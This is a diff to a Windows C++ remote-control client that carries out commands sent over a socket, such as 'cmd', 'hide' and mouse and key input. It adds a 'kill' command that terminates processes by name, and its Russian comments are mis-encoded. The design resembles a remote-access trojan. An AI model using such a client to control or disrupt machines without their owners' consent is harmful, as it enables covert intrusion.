@@ -1,13 +1,6 @@
 #include "Commands.h"
 #include "Online.h"
 
-#include <string>
-#include <vector>
-#include <regex>
-#include <thread>
-#include <stdio.h>
-#include <Windows.h>
-
 using namespace std;
 
 /* enum ¬сех команд, которые могут быть
@@ -25,7 +18,8 @@ typedef enum
 	CMD_CLOSE,
 	CMD_LANG,
 	CMD_HIDE,
-	CMD_MOUSECLICK
+	CMD_MOUSECLICK,
+	CMD_PROCESSKILL
 } Commands;
 
 /* —труктура дл€ сохранени€ соответстви€ между командой и строкой */
@@ -53,12 +47,13 @@ int doTask(SOCKET& server, int clientID, int commandID, string command, string c
 	  {"switch", CMD_SWITCH},
 	  {"press", CMD_PRESS},
 	  {"setmouse", CMD_SETMOUSE},
-	  {"movemouse", CMD_MOVEMOUSE},
+	  {"move", CMD_MOVEMOUSE},
 	  {"cmd", CMD_COMMANDLINE},
 	  {"close", CMD_CLOSE},
 	  {"lang", CMD_LANG},
 	  {"hide", CMD_HIDE},
 	  {"click", CMD_MOUSECLICK},
+	  {"kill", CMD_PROCESSKILL},
 	};
 
 	printf("started doing task: %s, %s...", command.c_str(), commandArgs.c_str());
@@ -140,6 +135,7 @@ int doTask(SOCKET& server, int clientID, int commandID, string command, string c
 			{
 				msg = "C$" + to_string(clientID) + "$" + to_string(commandID) + "$" + "unknown_command";
 				sendMessage(server, msg.c_str());
+				return 0;
 			}
 			SetCursorPos(stoi(pos[0]), stoi(pos[1]));
 		}
@@ -255,6 +251,45 @@ int doTask(SOCKET& server, int clientID, int commandID, string command, string c
 				sendMessage(server, msg.c_str());
 				return 0;
 			}
+		}
+		catch (const exception&)
+		{
+			failed = true;
+		}
+	}
+	break;
+	case CMD_PROCESSKILL:
+	{
+		string name;
+		try
+		{
+			name = commandArgs;
+			PROCESSENTRY32 entry;
+			entry.dwSize = sizeof(PROCESSENTRY32);
+
+			HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+			if (Process32First(snapshot, &entry) == TRUE)
+			{
+				while (Process32Next(snapshot, &entry) == TRUE)
+				{
+					_bstr_t b(entry.szExeFile);
+					const char* c = b;
+
+					if (_stricmp(c, name.c_str()) == 0)
+					{
+						HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
+
+						TerminateProcess(hProcess, 9);
+
+						puts("123");
+
+						CloseHandle(hProcess);
+					}
+				}
+			}
+			CloseHandle(snapshot);
+
 		}
 		catch (const exception&)
 		{
